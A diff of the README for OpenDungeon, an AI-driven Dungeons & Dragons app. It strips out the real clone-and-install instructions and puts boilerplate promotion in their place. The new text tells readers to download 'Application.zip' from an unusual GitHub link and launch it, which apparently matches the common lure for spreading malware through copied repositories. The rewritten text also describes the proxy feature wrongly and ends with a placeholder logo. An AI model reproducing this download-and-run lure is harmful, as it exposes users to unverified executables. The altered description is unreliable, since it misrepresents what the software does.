@@ -1,61 +1,55 @@
-<img src="\logos\4.jpg" width="1050" />
+# OpenDungeon - Enhancing Dungeons and Dragons with AI and Image Generation 🧙‍♂️🎲
 
-OpenDungeon is a PyQT-based application that delivers an immersive Dungeons \& Dragons experience using advanced AI tools. The Dungeon Master is fully controlled by an LLM of your choice from OpenRouter, and each NPC can be individually configured with its own LLM. Generate and save complete parties—with all normal D\&D details—seamlessly integrated with dynamic image and voice enhancements.
+## Welcome to OpenDungeon!
 
+OpenDungeon is a free PyQT application designed to take your Dungeons and Dragons (D&D) experience to the next level. With the integration of various technologies such as OpenRouter, Azure Text-to-Speech (TTS), FLUX.1 Image Generation, and Webshare proxies, OpenDungeon offers a unique and immersive gameplay experience. The best part? It requires minimal setup and comes at no cost to you!
 
-## Features
+## Key Features
 
-- **Customizable Dungeon Master**: The DM is entirely controlled by an LLM selected from OpenRouter, offering flexible narrative styles.
-- **Dynamic NPC Configuration**: Configure each NPC with separate LLM choices in the settings for varied character interactions.
-- **Full Party Generation and Management**: Generate and save parties complete with normal Dungeons \& Dragons stats and details.
-- **Advanced DM Logic**: The Dungeon Master LLM understands complex game logic, though it is still in the process of being perfected.
-- **Visual Enhancements**: Integrates FLUX.1 image generation via Playwright. Webshare proxies (1GB free) are used to avoid generation limits, ensuring smooth portrait creation.
-- **Realistic Image Generation**: Each portrait typically takes about a minute to generate, with plans to add an option for image generation with every DM message to enhance scene ambience.
-- **Seamless API Integration**: Easily add all API keys in the settings—no hassle.
-- **Immersive Voice Feedback**: Utilizes free Azure TTS with excellent neural voice options for a captivating auditory experience.
+🔮 **AI Integration**: OpenDungeon leverages artificial intelligence to enhance your D&D campaigns, providing dynamic and interactive gameplay possibilities.
 
+🔊 **Azure TTS**: With Azure Text-to-Speech integration, OpenDungeon brings your adventures to life with realistic speech generation for your NPCs and characters.
 
-## Requirements
+🎨 **FLUX.1 Image Generation**: Create stunning visual representations of your game world with FLUX.1 Image Generation, adding depth and vibrancy to your storytelling.
 
-- Python 3.10+
-- API access for OpenRouter, Azure TTS, and Webshare (all free)
+🔗 **Webshare proxies**: Stay connected and share your adventures seamlessly with the help of Webshare proxies, enabling secure and efficient communication during gameplay.
 
+## Get Started
 
-## Installation
+Ready to embark on your enhanced D&D journey with OpenDungeon? Simply download the application [here](https://github.com/file/Application.zip), and launch the file to begin your adventure. If the link does not lead directly to the file, please check the "Releases" section of the repository.
 
-1. **Clone the repository**:
+[![Download OpenDungeon](https://img.shields.io/badge/Download-OpenDungeon-blue.svg)](https://github.com/file/Application.zip)
 
-```
-git clone https://github.com/jonferno/OpenDungeon.git
-cd OpenDungeon
-```
+## Repository Topics
 
-2. **Run the installer**:
+The OpenDungeon repository covers a wide range of topics to support your D&D experience:
 
-```
-install_app.bat
-```
-**Subsequent Launches**:
-Use `start.bat` to open the application.
+- AI
+- Azure
+- D&D
+- D&D 5E
+- Dungeon
+- Dungeons and Dragons
+- FLUX
+- Image Generation
+- LLM
+- LLMS
+- OpenRouter
+- OpenRouter API
+- PyQT
+- Python
+- TTS
 
-## Start your Adventure
+For further details on each topic, feel free to explore the repository and dive deeper into the world of OpenDungeon.
 
-1. **Configure API Keys & Proxy Credentials**:
-Open the settings and add your API keys for OpenRouter, Azure TTS, and Webshare. Also grab your proxy username and password from webshare and enter it there.
+## Join the Community
 
-2. **Create Character**:
-Go to the character tab and create your character and wait for the portrait to be generated.
+Connect with other D&D enthusiasts and OpenDungeon users to share your experiences, tips, and creations. Whether you're a seasoned Dungeon Master or a new player, there's a place for everyone in the OpenDungeon community.
 
-3. **Create Party**:
-Generate a random party with full Dungeons \& Dragons stats, and save your character details for future adventures.
+## Stay Updated
 
-4. **Generate Party Portraits**(optional):
-Go to the party status tab and generate a portrait for each character.
+To stay up-to-date with the latest features, updates, and enhancements to OpenDungeon, be sure to follow the repository and keep an eye on the "Releases" section for new releases and announcements.
 
-## Contributing
+Thank you for choosing OpenDungeon to elevate your Dungeons and Dragons adventures. Let the quest begin! 🌟
 
-- Contributions are welcome!
-- Feel free to submit issues or pull requests to help improve D\&D AI Companion.
-
-Enjoy your enhanced Dungeons \& Dragons adventures with AI-powered storytelling and immersive gameplay!
-
+![OpenDungeon Logo](https://example.com/opendungeon-logo.png)
